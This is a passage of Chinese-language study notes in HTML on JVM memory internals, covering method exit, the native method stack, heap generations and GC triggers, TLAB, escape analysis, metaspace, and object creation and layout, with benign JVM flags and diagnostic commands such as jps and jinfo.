即调用该方法的指令的下一条指令的地址, 而异常退出的, 返回地址是要通过异常表来确定, 栈帧中一般不会保存这部分信息</li>\n<li>本质上, 方法的退出就是当前栈帧出栈的过程; 此时, 需要恢复上层方法的局部变量表、操作数栈、将返回值压入调用者栈帧的操作数栈、设置PC寄存器值等, 让调用者方法继续执行下去</li>\n<li>正常完成出口和异常完成出口的区别在于: 通过异常完成出口退出的不会给它的上层调用者产生任何的返回值</li>\n<li>执行引擎遇到任意一个方法返回的字节码指令(return),会有返回值传递给上层的方法调用者, 简称正常完成出口\n<ul>\n<li>一个正常方法调用完成之后究竟需要使用哪一个返回指令还需要根据方法返回值的实际数据类型而定</li>\n<li>在字节码指令中, 返回指令包含ireturn(当前返回值是boolean、byte、char、short、int类型时使用)、lreturn、freturn、dreturn以及areturn(引用类型); 另外还有一个return指令供声明为void的方法、实例初始化方法、类和接口的初始化方法使用</li>\n</ul>\n</li>\n<li>在方法执行过程中遇到了异常, 并且这个异常没有在方法内处理, 也就是没有在本地的异常表中没有搜索到匹配的异常处理器, 就会导致方法退出, 简称异常完成出口(方法执行过程中抛出异常时的异常处理, 储存在一个处理表中)</li>\n</ul>\n<h4><a id=\"226__252\"></a>2.2.6 一附加信息</h4>\n<p>栈帧中还允许携带与ava虚拟机实现相关的一些附加信息, 比如对程序调试提供支持的信息</p>\n<h3><a id=\"23__256\"></a>2.3 本地方法栈</h3>\n<ul>\n<li>Java虚拟机栈用于管理Java方法的调用, 而本地方法栈用于管理本地方法的调用</li>\n<li>本地方法栈, 也是线程私有的</li>\n<li>允许被实现成固定或者是可扩展的内存大小\n<ul>\n<li>如果线程请求分配的栈容量超过本地方法栈允许的最大容量, Java虚拟机将会抛出一个StackOverflowError异常</li>\n<li>如果本地方法栈可以动态扩展, 并且在尝试扩展的时候无法申请到足够的内存, 或者在创建线程时没有足够的内存去创建对应的本地方法栈, 那么Java虚拟机将会抛出一个OutofMemoryError异常</li>\n</ul>\n</li>\n<li>本地方法是使用C/C++语言实现的</li>\n<li>加载本地方法的具体做法是Native Method Stack中登记native方法, 在Execution Engine执行时加载本地方法库</li>\n<li>当某个线程调用一个本地方法时, 它就进入了一个全新的并且不再受虚拟机限制的世界; 它和虚拟机拥有同样的权限\n<ul>\n<li>本地方法可以通过本地方法接口来访问虚拟机内部的运行时数据区</li>\n<li>它甚至可以本地处理器中的寄存器</li>\n<li>直接从本地内存的堆中分配任意数量的内存</li>\n</ul>\n</li>\n<li>并不是所有的JVM都支持本地方法栈 因为Java虚拟机规范并没有明确要求本地方法栈的使用语言、具体实现方式、数据结构; 如果JVM产品不打算支持native方法, 也可以无需实现本地方法栈</li>\n<li>在HotSpot中, 直接将本地方法栈和虚拟机栈合二为一</li>\n</ul>\n<h3><a id=\"24__272\"></a>2.4 堆</h3>\n<ul>\n<li>一个JVNM实例只存在一个堆内存, 堆也是Java内存管理的核心区域</li>\n<li>Java堆内存的JVM启动的时候即被创建, 其空间大小也就确定了; 堆区是JVM管理的最大一块内存空间(堆内存的大小是可以调节的)</li>\n<li>《JVM虚拟机规范》规定, 堆可以处于物理上不连续的内存空间, 但是在逻辑上它应该被视为连续的</li>\n<li>所有的的线程共享Java堆, 在这里还可以划分为线程私有的缓冲区(Thread Local Allocation Buffer TLAB)</li>\n<li>堆, 是GC(Garbage Collection 垃圾回收器) 执行垃圾回收的重点区域</li>\n<li>在方法结束后, 堆中的对象不会马上被移除, 仅仅在垃圾收集的时候才会移出(GC的启动也需要消耗系统资源, 所以GC并不会频繁的启动)</li>\n</ul>\n<pre><code class=\"lang-properties\"># 打印虚拟机参数(加号表示启用 减号表示不启用)\njava -XX:+PrintFlagsFinal | wc -l \n</code></pre>\n<pre><code class=\"lang-properties\">-Xms20m -Xmx20m(默认单位字节) -XX:+PrintGCDetails\n</code></pre>\n<p>现代垃圾收集器都基于分代收集理论设计, 堆内存<strong>逻辑</strong>上细分为新生代(New)、老年代(Tenured, Old )以及元空间(Metaspace)(Java8之前叫作永久代)</p>\n<h4><a id=\"241___292\"></a>2.4.1  堆空间大小的设置</h4>\n<ul>\n<li>\n<p>-Xms 用于设置堆区的起始内存(年轻代 +老年代), 等价于-XX:InitialHeapSize</p>\n</li>\n<li>\n<p>-Xmx 则用于设置堆区的最大内存(年轻代 +老年代), 等价于-XX:MaxHeapSize</p>\n</li>\n<li>\n<p>一旦堆区中的内存大小超过了-Xmx所指定的最大内存时, 将会抛出OutofMemoryError异常</p>\n</li>\n<li>\n<p>通常会将-Xms和-Xmx两个参数配置相同的值, 其目的在于为了能够在Java垃圾回收机制清理完堆区后不需要重新分隔计算堆区的大小, 从而提高性能</p>\n</li>\n<li>\n<p>默认堆空间的大小</p>\n<ul>\n<li>初始内存大小:物理电脑内存 / 64</li>\n<li>最大内存大小: 物理内存大小 / 4</li>\n</ul>\n</li>\n<li>\n<p>查看设置堆空间的参数的详细信息</p>\n<pre><code class=\"lang-properties\"># 方式一\n1&gt; jps\n2&gt; jstat -gc pid\n#方式二\n-XX:PrintGCDetails\n</code></pre>\n</li>\n</ul>\n<h4><a id=\"242___317\"></a>2.4.2  年轻代和老年代</h4>\n<ul>\n<li>\n<p>储存在JVM中Java对象可以被划分为两类</p>\n<ul>\n<li>一类是生命周期较短的瞬时对象, 这类对象的创建和消亡都非常迅速</li>\n<li>另外一类对象的生命周期却非常长, 在某些极端情况下还能够与JVM的生命周期保持一致</li>\n</ul>\n</li>\n<li>\n<p>Java堆区进一步细分的话, 可以划分为年轻代(YoungGen)和老年代(OldGen)</p>\n</li>\n<li>\n<p>其中年轻代又可以划分为Eden空间、Survivor0空间和Survivor1空间(有时也叫from区、to区 s0/s1 空的为to区)</p>\n</li>\n<li>\n<p>配置年轻代和老年代在堆结构的占比</p>\n<pre><code class=\"lang-properties\">-XX:NewRatio=2 表示新生代占1 老年代占2, 新生代占整个堆的1/3\n</code></pre>\n</li>\n<li>\n<p>查看默认年轻代和老年代在堆结构的占比</p>\n<pre><code class=\"lang-properties\"># 显示当前所有java进程pid\njps\n# 查看默认年轻代和老年代在堆结构的占比为2(新生代占1.老年代占2)\njinfo -flag NewRatio pid\n&gt;&gt;&gt; -XX:NewRatio=2\n# 查看Eden空间和另外两个Survivor空间缺省所占的比例(默认Eden空间占8份)\njinfo -flag SurvivorRatio 进程pid\n&gt;&gt;&gt; -XX:SurvivorRatio=8\n</code></pre>\n</li>\n<li>\n<p>在HotSpot中, Eden空间和另外两个Survivor空间缺省所占的比例是8:1:1</p>\n</li>\n<li>\n<p>可以使用选项-XX:SurvivorRatio调整这个空间比例</p>\n</li>\n<li>\n<p>几乎所有的Java对象都是在Eden区被new出来的</p>\n</li>\n<li>\n<p>绝大部分的Java对象的销毁都是在年轻代进行的</p>\n</li>\n<li>\n<p>可以使用选项-Xmn设置新生代最大内存大小</p>\n</li>\n<li>\n<p>关于垃圾回收: 频繁的新生区收集, 很少在养老区收集, 几乎不在元空间收集</p>\n</li>\n<li>\n<p>YGC:年轻代中的垃圾回收器</p>\n</li>\n<li>\n<p>FGC:老年代中的垃圾回收器</p>\n</li>\n</ul>\n<h4><a id=\"243__MinorGCYGCMajorGC_FullGC_363\"></a>2.4.3  MinorGC(YGC)、MajorGC、 FullGC</h4>\n<p>JVM在进行GC时, 并非每次都对上面三个内存(新生代、老年代、方法区)区域一起回收, 大部分回收的都是指新生代</p>\n<p>针对HotSpot VM的实现, 它里面的GC按照回收区域又分为两大种类型: 一种是部分收集(Partial GC), 一种是整堆收集(Full GC)</p>\n<ul>\n<li>部分收集: 指目标不是完整收集整个Java堆的垃圾收集\n<ul>\n<li>新生代收集(Minor GC / Young GC) : 只是新生代(Eden/S0, S1)的垃圾收集</li>\n<li>老年代收集(Major GC / Old GC) : 只是老年代的垃圾收集\n<ul>\n<li>目前 , 只有CMS GC会有单独收集老年代的行为</li>\n<li>注意, 很多时候Major GC会和 Full GC混淆使用, 需要具体分辨是老年代回收还是整堆回收</li>\n</ul>\n</li>\n<li>混合收集(Mixed GC) : 收集整个新生代以及部分老年代的垃圾回收\n<ul>\n<li>目前只有G1 GC会有这种行为</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>整堆收集(Full GC):  收集整个Java堆和方法区的垃圾收集</li>\n</ul>\n<h4><a id=\"243_GC_378\"></a>2.4.3 分代式GC策略的触发条件</h4>\n<ul>\n<li>\n<p>年轻代GC(Minor GC)触发机制:</p>\n<pre><code class=\"lang-properties\">1&gt; 当年轻代空间不足时, 就会触发Minor GC, 这里的年轻代满指的是Eden满, Survivor满不会引起GC(每次Minor GC会清理年轻代的内存)\n2&gt; 因为Java对象大多都具备朝生夕灭的特性, 所以Minor GC非常频繁, 一般回收速度也比较快\n3&gt; Minor GC会引发STW(Stop The World), 暂停其他用户的线程, 等待垃圾回收结束, 用户线程才恢复运行\n</code></pre>\n</li>\n<li>\n<p>老年代(Major GC / Full GC)触发机制:</p>\n<pre><code class=\"lang-properties\">1&gt; 指发生在老年代的GC, 对象从老年代消失, 即Major GC或者Full GC发生了\n2&gt; 出现了Major GC, 经常会伴随至少一次的Minor GC(但非绝对的, 在Parallel Scavenge收集器的收集策略中) 注: 也就是在老年代空间不足时, 会先尝试进行Major GC的策略选择过程触发Minor GC; 如果之后空间还不足, 则触发Major GC\n3&gt; Major GC的速度一般会比Minor GC慢10倍以上, STW的时间更长\n4&gt; 如果Major GC后, 内存还不足, 就报OOM\n</code></pre>\n</li>\n<li>\n<p>Full GC触发机制</p>\n<pre><code class=\"lang-properties\">1&gt; 调用System.gc()时, 系统建议执行Full GC, 但是不必然执行\n2&gt; 老年代空间不足\n3&gt; 方法区空间不足\n4&gt; 通过Minor GC后进入老年代的平均大小大于老年代的可用内存\n</code></pre>\n</li>\n</ul>\n<h4><a id=\"245__406\"></a>2.4.5 堆空间分代思想</h4>\n<p>堆分代的唯一理由就是<strong>优化GC性能</strong></p>\n<p>经研究, 不同的对象的生命周期不同, 70%-90%的对象是临时对象</p>\n<ul>\n<li>新生代: 有Eden、两块大小相同的Survivor构成,  to总为空</li>\n<li>老年代: 存放新生代中经历多次GC仍然存活的对象</li>\n</ul>\n<h4><a id=\"246__415\"></a>2.4.6 内存分配策略</h4>\n<pre><code class=\"lang-properties\">如果对象在Eden出生并经过第一次Minor GC后仍然存活, 并且能被Survivor容纳的话, 将被移动到Survivor空间中, 并将对象年龄设为1; 对象在Survivor区中没每经过一次Minor GC, 年龄就增加一岁, 当它的年龄增加到一定程度(默认为15岁, 每个JVM, 每个GC都有所不同)时, 就会被晋升到老年代中; \n对象晋升老年代的年龄阈值可以通过选项 -XX:MaxTenuringThreshold来设置\n</code></pre>\n<ul>\n<li>\n<p>优先分配到Eden</p>\n</li>\n<li>\n<p>大对象直接分配到老年代(尽量避免程序中出现过多的大对象)</p>\n</li>\n<li>\n<p>长期存活的对象分配到老年代</p>\n</li>\n<li>\n<p>动态对象年龄判断</p>\n<ul>\n<li>如果Survivor区中相同年龄的的所有对象大小的总和大于survivor空间的一半, 年龄大于或者等于该年龄的对象可以直接进入老年代, 无须等到MaxTenuringThreshold种要求的年龄</li>\n</ul>\n</li>\n<li>\n<p>空间分配担保</p>\n<pre><code class=\"lang-properties\">-XX:HandlePromotionFailure(JDK7以后失效了)\n</code></pre>\n</li>\n</ul>\n<h4><a id=\"247_TLABThread_Local_Allocation_Buffer_439\"></a>2.4.7 TLAB(Thread Local Allocation Buffer)</h4>\n<p>什么是TLAB?</p>\n<ul>\n<li>\n<p>线程本地分配缓存区</p>\n</li>\n<li>\n<p>从内存模型而不是垃圾回收的角度, 对Eden区继续进行划分, JVM为每个线程分配了一个私有的缓存区域, 它包含在Eden空间内</p>\n</li>\n<li>\n<p>多线程同时分配内存时, 使用TLAB可以避免一系列的非线程安全问题, 同时还能够提升内存分配的吞吐量, 因此我们将这种内存的分配方式称之为快速分配策略</p>\n</li>\n</ul>\n<p>为什么需要TLAB</p>\n<ul>\n<li>堆区是线程共享的区域, 任何线程都可以访问到堆区中的共享数据 由于对象实例的创建在JVM中非常频繁, 因此在并发环境中从堆区化分内存空间是线程不安全的</li>\n<li>为避免多个线程操作同一地址, 需要使用加锁等机制, 进而影响分配速度</li>\n</ul>\n<p>tips:</p>\n<ul>\n<li>尽管不是所有的对象实例都能够在TLAB中成功分配内存, 但JVM确实是将TLAB作为内存分配的首选</li>\n<li>在程序中, 可以通过选项<code>-XX:UseTLAB</code>设置是否开启TLAB空间(JDK8及其之后默认开启)</li>\n<li>默认情况下, TLAB空间的内存非常小, 仅占有整个Eden空间的1%, 可以通过选项<code>-XX:TLABWasteTargetPercent</code>设置TLAB</li>\n<li>一旦对象在TLAB空间分配内存失败, JVM就会尝试通过使用加锁机制来确保数据操作的原子性, 从而直接在Eden空间中分配内存</li>\n</ul>\n<h4><a id=\"248__460\"></a>2.4.8 堆空间常用参数设置</h4>\n<pre><code class=\"lang-properties\">-XX:+PrintFalgsFinal   查看所有参数的最终值\n-XX:+PrintFlagsInitial 查看所有参数的默认初始值\n-Xmn=xxx               设置新生代的大小\n</code></pre>\n<h4><a id=\"249__468\"></a>2.4.9 逃逸分析</h4>\n<p>堆是分配对象存储的唯一选择吗?</p>\n<p>随着JIT编译器的发展与逃逸分析技术逐渐成熟, 栈上分配、标量替换优化技术将会导致一些微秒的变化, 所有的对象不一定都分配到堆上</p>\n<p>在Java虚拟机中, 对象是在Java堆中分配内存的, 这是一个普遍的常识; 但是有一种特殊的情况, 那就是如果经过逃逸分析后发现, 一个对象并没有逃逸出方法的话, 那么就可能会优化成栈上分配, 这样就无需在堆上分配内存, 也无需进行垃圾回收了, 即堆外存储技术</p>\n<p>如何将堆上地对象分配到栈上, 需要使用逃逸分析手段</p>\n<pre><code class=\"lang-properties\">逃逸分析是一种可以有效减少Java程序中同步负载和内存堆分配压力的跨函数全局数据流分析算法\n</code></pre>\n<pre><code class=\"lang-properties\">#逃逸分析的基本行为就是分析对象动态作用域:\n当一个对象在方法中被定义后, 对象只在方法内部使用, 则认为没有发生逃逸\n当一个对象在方法中被定义后, 它被外部方法所引用, 则认为发生逃逸, 比如作为调用参数传递到其他地方中\n</code></pre>\n<p>tip: <strong>开发中能使用局部变量的, 就不要使用在方法外定义的变量</strong></p>\n<pre><code class=\"lang-properties\">#开启逃逸分析\n-XX:+DoEscapeAnalysis\n#关闭逃逸分析\n-XX:-DoEscapeAnalysis\n#JDK7之后默认开启\n</code></pre>\n<h5><a id=\"249_1__498\"></a>2.4.9 .1 标量替换</h5>\n<p>标量(Scalar) 是指一个无法再分解成更小的数据的数据</p>\n<p>Java中原始数据类型就是标量</p>\n<p>相对的, 那些还可以分解的数据叫做聚合量</p>\n<p>Java中对象就是聚合量</p>\n<p>在JIT阶段, 如果经过逃逸分析, 发现一个对象不会被外界访问的话, 那么经过JIT优化, 就会把这个对象拆解成若干个其他成员变量来代替, 这个过程就是标量替换</p>\n<pre><code class=\"lang-properties\">#标量参数替换设置\n-XX:EliminateAllocations(默认打开, 允许将对象打散分配在栈上)\n</code></pre>\n<h3><a id=\"25__515\"></a>2.5 方法区</h3>\n<p>《Java虚拟机规范》说明方法区在逻辑上是属于堆的一部分, 但是对于Java虚拟机的实现之一的HotSpot而言, 方法区还有一个别名叫做Non-Heap(非堆), 目的就是要和堆分开, 所以, 方法区看作是一块独立于Java堆的内存空间</p>\n<p>目前, 元空间(Metaspace)是方法区的具体落地实现</p>\n<ul>\n<li>方法区(Method Area)与堆一样, 是各个先线程共享的区域</li>\n<li>方法区在JVM启动的时候被创建, 并且它的实际物理内存空间中和Java堆区一样都可以是不连续的</li>\n<li>方法区的大小和堆空间一样, 可以选择固定大小或者可扩展</li>\n<li>方法区的大小决定了系统可以保存多少个类, 如果系统定义了太多的类, 导致方法区溢出, 虚拟机同样会抛出内存溢出错误</li>\n<li>关闭JVM就会释放这个区域的内存</li>\n</ul>\n<h4><a id=\"251_HotSpot_527\"></a>2.5.1 HotSpot中方法区的演进</h4>\n<ul>\n<li>在JDK7及以前, 习惯上把方法区称为永久代; JDK8开始, 使用元空间取代了永久代</li>\n<li>本质上, 方法区和永久代并不等价; 仅是对于HotSpot而言的(HotSpot中永久代就是方法区的实现) ,《Java虚拟机规范》中对于如何实现方法区, 不做统一要求, 例如 BEA  JRocket / IBM J9中不存在永久代的概念</li>\n<li>在JDK8完全废弃了永久代的概念, 改用与JRocket、J9一样在本地内存中实现的元空间(Metaspace)来代替</li>\n<li>元空间的本质和永久代类似, 都是JVM规范中方法区的实现, 不过元空间与永久代最大的区别在于: <strong>元空间不在虚拟机设置的内存中, 而是使用本地内存</strong></li>\n<li>永久代、元空间二者并不只是名字变化了, 内部的结构也调整了</li>\n<li>根据《Java虚拟机规范》的规定, 如果方法区无法满足新的内存分配需求, 将抛出OOM异常</li>\n</ul>\n<h4><a id=\"252__536\"></a>2.5.2 设置方法区大小的参数</h4>\n<pre><code class=\"lang-properties\"># 设置永久代空间的大小\n-XX:PermSize\n# 设置永久代空间的最大值\n-XX:MaxPermSize\n# 默认元空间的初始值大小\njps\njinfo -flag MetaspaceSize pid\n&gt;&gt;&gt; -XX:MetaspaceSize=21807104\n# 默认元空间的最大值\njinfo -flag MaxMetaspaceSize pid\n&gt;&gt;&gt; -XX:MaxMetaspaceSize=18446744073709486080\n</code></pre>\n<pre><code class=\"lang-properties\"># 设置元空间的初始值大小\n-XX:MetaspaceSize=10m\n# 设置元空间的最大值\n-XX:MaxMetaspaceSize=100m\n</code></pre>\n<h4><a id=\"253__559\"></a>2.5.3 方法区的作用</h4>\n<p>它用于储存已被虚拟机加载的类型信息、常量、静态变量、即时编译器编译后的代码缓存等</p>\n<h5><a id=\"2531__563\"></a>2.5.3.1 类型信息</h5>\n<p>对每个加载的类型(类class、接口interface、枚举enum、注解annotation), JVM必须在方法区中存储以下类型信息</p>\n<ul>\n<li>这个类型的完整有效名称(包名.类名)</li>\n<li>这个类型直接父类的完整有效名(对于interface和java.lang.Object都没有父类)</li>\n<li>这个类型的修饰符(public, abstract, final的某个子集)</li>\n<li>这个类型直接接口的一个有序列表</li>\n</ul>\n<h5><a id=\"2532_Field_572\"></a>2.5.3.2 域(Field)信息</h5>\n<ul>\n<li>JVM必须在方法区中保存类型的所有域的相关信息以及域的声明顺序</li>\n<li>域的相关信息包括: 域名称、域类型、域修饰符(public, private, protected, static, volatile, transient的某个子集)</li>\n</ul>\n<h5><a id=\"2533_Method_577\"></a>2.5.3.3 方法(Method)信息</h5>\n<ul>\n<li>\n<p>方法名称</p>\n</li>\n<li>\n<p>方法的返回类型</p>\n</li>\n<li>\n<p>方法参数的数量和类型</p>\n</li>\n<li>\n<p>方法的修饰符(public, private, protected, static, final, synchronized, native, abstract的一个子集)</p>\n</li>\n<li>\n<p>方法的字节码文件、操作数栈、局部变量表及大小(abstract和native方法除外)</p>\n</li>\n<li>\n<p>异常表(abstract和native方法除外)</p>\n<pre><code class=\"lang-properties\">每个异常处理的开始位置、结束位置、代码处理在程序计数器中的偏移地址、被捕获的异常类的常量池索引\n</code></pre>\n</li>\n</ul>\n<h5><a id=\"2534_class_596\"></a>2.5.3.4 class文件中常量池</h5>\n<p>一个有效的字节码文件中除了包含类的版本信息、字段、方法以及接口描述信息外, 还包含一项信息那就是常量池表(Constant Pool Table),  包含各种字面量和对类型、域和方法的符号引用</p>\n<p>一个Java源文件中的类、接口, 编译后产生一个字节码文件, 而Java中的字节码需要数据支持, 通常这种数据会很大以至于不能直接存到字节码里, 换另一种方式, 可以存到常量支持池中, 这个字节码包含了指向常量池的引用, 并在动态链接的时候使用运行时常量池(相当于Maven仓库一样)</p>\n<p>常量池可以看做是一张表, 虚拟机指令根据这张常量表找到要执行的类名、方法名、参数类型、字面量等类型</p>\n<h5><a id=\"2535__604\"></a>2.5.3.5 运行时常量池</h5>\n<ul>\n<li><strong>class文件中的常量池经过类加载器放到方法区以后就叫做运行时常量池</strong></li>\n<li>运行时常量池(Runtime Constant Pool) 是方法区的一部分</li>\n<li>常量池表(Constant Pool Table) 是Class文件的一部分, 用于存放编译期生成的各种字面量与符号引用, <strong>这部分内容将在类加载后存放到方法区的运行时常量池中</strong></li>\n<li>运行时常量池, 在加载类和接口到虚拟机后, 就会创建对应的运行时常量池</li>\n<li>JVM为每个已加载的类型(类或者接口)都维护一个常量池; 池中的数据项像数组项一样, 是通过索引访问的</li>\n<li>运行时常量池中包含多种不同的常量, 包括编译期就已经明确的数值常量, 也包括到运行期解析后才能够获得的方法或者字段引用, 此时不再是常量池中的符号地址了, 这里换为真实地址</li>\n<li>运行时常量池具有动态性</li>\n<li>当创建类或者接口的运行时常量池时, 如果构造运行时常量池所需的内存空间超过了方法区所能提供的最大值, JVM将会抛出OOM</li>\n</ul>\n<h5><a id=\"2536__615\"></a>2.5.3.6 方法区的演进细节</h5>\n<p>只有在HotSpot中才有永久代, BEA的JRocket和IBM的J9都是不存在永久代的概念的; 原则上如何实现方法区属于虚拟机实现的细节,不受《Java虚拟机规范》管束, 并不要求同一</p>\n<table>\n<thead>\n<tr>\n<th>JDK6及之前</th>\n<th>有永久代(permanent generation) , 字符串常量池、 静态变量存放在永久代上</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>JDK7</td>\n<td>有永久代, 但是已经逐步&quot;去永久代&quot;, 字符串常量池、静态变量移出, 保存在堆中(永久代仍然使用Java虚拟机内存)</td>\n</tr>\n<tr>\n<td>JDK8及之后</td>\n<td>无永久代, 类型信息、方法、字段、常量保存在本地内存的元空间(方法区), 但是字符串常量池、静态变量仍在堆中</td>\n</tr>\n</tbody>\n</table>\n<p>随着Java8的到来, HotSpot VM中再也见不到了永久代了; 但是这并不意味着类的元数据信息也消失了, 这些数据被移到了一个与堆不相连的本地内存区域, 这个区域叫做元空间(Metaspace)</p>\n<p>由于类的元数据分配在本地内存中; 元空间的最大分配内存空间就是系统可用的内存空间</p>\n<p>永久代为什么要被元空间替换?</p>\n<pre><code class=\"lang-properties\">1&gt; 为元空间设置空间大小是很难确定的, 在某些场景中, 如果动态加载类过多, 容易产生Perm区的OOM, 而元空间与永久代之间的最大区别在于: 元空间并不在虚拟机中, 而是使用本地内存, 因此, 默认情况下, 元空间的大小仅受本地内内存限制\n2&gt; 对永久代进行调优是很困难的\n</code></pre>\n<h5><a id=\"2537__635\"></a>2.5.3.7 方法区的垃圾回收</h5>\n<p>方法区的垃圾收集主要回收两部分内容: 常量池中废弃的常量和不再使用的类型</p>\n<p>方法区内的常量池之中主要存放的两大类常量: 字面量和符号引用; 字面量比较接近Java语言层次的常量概念, 如文本字符串、被声明为final的常量值等; 而符号引用则属于编译原理方面的概念, 包括下面三类常量:</p>\n<ul>\n<li>类和接口的全限定类名</li>\n<li>字段的名称和描述符</li>\n<li>方法的名称的描述符</li>\n</ul>\n<p>HotSpot VM对常量池的回收策略是很明确的, 只要常量池中的常量没有被任何地方引用, 就可以被回收</p>\n<p>回收废弃常量与回收Java堆中的对象非常类似</p>\n<p>判断一个常量是否&quot;废弃&quot;还是相对简单, 而要判定一个类型是否&quot;不再被使用的类&quot;的条件就比较苛刻了:</p>\n<ul>\n<li>该类的所有实例都已经被回收, 也就是Java堆中不存在该类及其任何派生类的实例</li>\n<li>加载该类的类加载已经被回收, 这个条件除非是经过精心设计的可替换类加载器的场景, 如OSGI、JSP的重加载等, 否者是很难达成的</li>\n<li>该类对应的java.lang.Class对象没有在任何地方被引用, 无法在任何地方通过反射方法访问该类的方法</li>\n</ul>\n<p>Java虚拟机被允许对满足以上三个条件的无用类进行回收, 这里说的仅仅是&quot;被允许&quot;而并不是和对象一样, 没有了引用就必然会回收</p>\n<p>在大量使用反射、动态代理、CGLib等字节码框架, 动态生成JSP以及OSGI这类频繁自定义类加载器的场景中, 通常都需要Java虚拟机具备类型卸载的能力, 以保证不会对方法区造成大的内存压力</p>\n<h5><a id=\"2538__659\"></a>2.5.3.8 字符串常量池的位置为什么要调整?</h5>\n<p>JDK7中将StringTable放到了堆空间中; 因为永久代的回收效率很低, 在full gc时才会触发; 而full gc是老年代的空间不足、永久代不足时才会触发, 这就导致StringTable回收效率不高, 而我们开发中会有大量的字符串被创建, 回收效率低, 导致永久代内存不足; 放到堆里, 能够及时回收内存;</p>\n<p><img src=\"https://cdn.qingweico.cn/blog/604e1e0d5aedab222c229f9b.png\" alt=\"JVM\" /></p>\n<h3><a id=\"26__665\"></a>2.6 对象的创建</h3>\n<h4><a id=\"261__667\"></a>2.6.1 判断对象对应的类是否加载、链接、初始化</h4>\n<pre><code class=\"lang-properties\">虚拟机遇到一条new指令; 首先去检查这个指令的参数是否在Metaspace的常量池中定位到一个类的符号引用, 并且检查这个符号引用代表的类是否已经被加载、解析和初始化(即判断类元信息是否存在); 如果没有, 那么在双亲委派模式下, 使用当前类加载器ClassLoader+包名+类名为key进行查找对应的.class文件; 如果没有文件,则抛出ClassNotFoundException异常, 如果找到, 则进行类加载, 并生成对应的Class类对象\n</code></pre>\n<h4><a id=\"262__673\"></a>2.6.2 为对象分配内</h4>\n<p>首先计算对象占用空间大小,接着在堆中划分一块内存给新对象,如果实例成员变量是引用变量,仅分配引用变量空间即可, 即4个字节大小</p>\n<ul>\n<li>如果内存是规整的, 那么虚拟机将采用的是指针碰撞法(Bump The Pointer)来分配内存</li>\n</ul>\n<pre><code class=\"lang-properties\">指针碰撞法: 所有用过的内存在一边, 空闲的内存在另外一边, 中间放着一个指针作为分界点的指示器, 分配内存仅仅是把指针向空闲那边挪动一段与对象大小相等的距离罢了.如果垃圾收集器选择的是Serial, ParNew这种基于压缩算法的, 虚拟机采用这分配方式, 一般使用带有compact(整理)过程的收集器时, 使用指针碰撞.\n</code></pre>\n<ul>\n<li>如果内存是不规整的, 虚拟机需要维护一个列表</li>\n</ul>\n<pre><code class=\"lang-properties\">如果内存不是规整的, 已使用的内存和未使用的内存相互交错, 那么虚拟机将采用的是空闲列表法来为对象分配内存\n虚拟机维护了一个列表, 记录哪些内存块是可用的, 再分配的时候从列表中找到一块足够大的空间划分给对象实例, 并更新列表上的内容, 这种分配方式成为(Free List).\n</code></pre>\n<h4><a id=\"263__690\"></a>2.6.3 处理并发安全问题</h4>\n<ul>\n<li>采用CAS失败重试, 区域加锁保证更新的原子性</li>\n<li>每个线程预先分配一块TLAB</li>\n</ul>\n<h4><a id=\"264__695\"></a>2.6.4 初始化分配到的空间</h4>\n<p>所有属性设置默认值, 保证对象实例字段在不赋值时可以直接使用</p>\n<ul>\n<li>属性的默认初始化</li>\n</ul>\n<h4><a id=\"265__701\"></a>2.6.5 设置对象的对象头</h4>\n<p>将对象的所属类(即类的元数据信息), 对象hashCode和对象的GC信息, 锁信息等数据存储在对象的对象头中, 这个过程的具体设置方式取决于JVM实现</p>\n<h4><a id=\"266_init_705\"></a>2.6.6 执行init方法进行初始化</h4>\n<pre><code class=\"lang-properties\">在Java程序的视角看, 初始化才正式开始,初始化成员变量, 执行实例化代码块, 调用类的构造方法, 并把堆内对象的首地址赋值给引用变量. 因此一般来说(由字节码中是否跟随有invokespecial指令所决定), new指令之后会接着执行方法, 把对象按照程序员的意愿进行初始化, 这样一个真正可用的对象才算完全创建出来\n</code></pre>\n<ul>\n<li>显示初始化</li>\n<li>代码块中的初始化</li>\n<li>构造器中初始化</li>\n</ul>\n<h3><a id=\"27__715\"></a>2.7 对象的内存布局</h3>\n<h4><a id=\"271Header_717\"></a>2.7.1对象头(Header)</h4>\n<ul>\n<li>运行时元数据(Mark Word)\n<ul>\n<li>哈希值</li>\n<li>GC分代年龄</li>\n<li>锁状态标志(3位)\n<ul>\n<li>是否上锁</li>\n<li>轻量级锁</li>\n<li>重量级锁</li>\n<li>是否被GC标记</li>\n<li>是否偏向</li>\n</ul>\n</li>\n<li>Lock Record Address\n<ul>\n<li>轻量级锁(指向栈中的锁记录)</li>\n<li>检查Mark Word是否指向当前线程的栈</li>\n</ul>\n</li>\n<li>Monitor Address</li>\n<li>Forwarding Address</li>\n<li>线程持有的锁</li>\n<li>偏向线程ID</li>\n<li>偏向时间戳</li>\n</ul>\n</li>\n<li>类型指针: 指向类元数据InstanceClass, 确定该对象所属的类型(指向方法区对象数据类型的指针)</li>\n<li>如果是数组, 还需记录数组的长度</li>\n</ul>\n<h4><a id=\"27_2__Instance_Data_739\"></a>2.7. 2 实例数据 (Instance Data)</h4>\n<p>它是对象真正存储的有效信息, 包括程序代码中定义的各种类型的字段(包括从父类继承下来的本身拥有的字段)</p>\n<p>规则:</p>\n<ul>\n<li>相同宽度的字段总是被分配在一起</li>\n<li>父类中定义的变量会出现在子类之前</li>\n<li>如果CompactFields参数为true(默认为true): 子类的窄变量可能插入到父类变量的空隙</li>\n</ul>\n<h4><a id=\"273_Padding_749\"></a>2.7.3 对齐填充(Padding)</h4>\n<p>不是必须的, 也没有特别的含义, 仅仅起到占位符的作用</p>\n<p>由于HotSpot VM的自动内存管理系统要求对象起始地址必须是8字节的整数倍, 即任何对象的大小都必须是8字节的整数倍, 如果对象实例数据部分没有对其的话, 就要通过字节填齐来补全</p>\n<p><img src=\"https://cdn.qingweico.cn/blog/603658cc5f4313ce25534991.png\" alt=\"\" /></p>\n<h4><a id=\"274__JOL__Java_Object_Layout_757\"></a>2.7.4 工具: JOL = Java Object Layout</h4>\n<pre><code class=\"lang-properties\">&lt;dependencies&gt;\n    &lt;!-- https://mvnrepository.com/artifact/org.openjdk.jol/jol-core --&gt;\n    &lt;dependency&gt;\n        &lt;groupId&gt;org.openjdk.jol&lt;/groupId&gt;\n        &lt;artifactId&gt;jol-core&lt;/artifactId&gt;\n        &lt;version&gt;0.9&lt;/version&gt;\n    &lt;/dependency&gt;\n&lt;/dependencies&gt;\n</code></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span 